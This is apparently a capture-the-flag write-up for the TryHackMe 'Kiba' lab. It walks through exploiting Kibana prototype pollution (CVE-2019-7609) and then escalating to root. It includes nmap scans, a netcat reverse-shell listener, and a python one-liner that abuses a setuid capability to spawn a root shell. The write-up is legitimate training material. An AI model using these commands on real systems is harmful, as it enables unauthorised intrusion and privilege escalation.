---
description: https://tryhackme.com/room/kiba
---

# kiba

## :writing\_hand: Solution

### What is the vulnerability that is specific to programming languages with prototype-based inheritance?

![](<../../.gitbook/assets/Screenshot from 2020-09-29 22-43-00.png>)

### What is the version of visualization dashboard installed in the server?

![](<../../.gitbook/assets/Screenshot from 2020-09-29 23-16-56.png>)

### What is the CVE number for this vulnerability?

![](<../../.gitbook/assets/Screenshot from 2020-09-29 22-51-05.png>)

### Compromise the machine and locate user.txt

```
nmap 10.10.191.136
nmap -p5601 10.10.191.136
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 22-43-59.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-29 22-53-54.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-29 23-50-49.png>)

```
nc -nvlp 4444
$ ls -lA /home
$ ls -lA /home/kiba
$ cat /home/kiba/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 23-27-05.png>)

### How would you recursively list all of these capabilities?

> getcap  -r /

### Escalate privileges and obtain root.txt

```
getcap -r /
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
$ cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 00-27-54.png>)

## Support Material

{% embed url="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications" %}

{% embed url="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" %}

{% embed url="https://github.com/mpgn/CVE-2019-7609" %}

{% embed url="https://feichashao.com/capabilities_basic/" %}
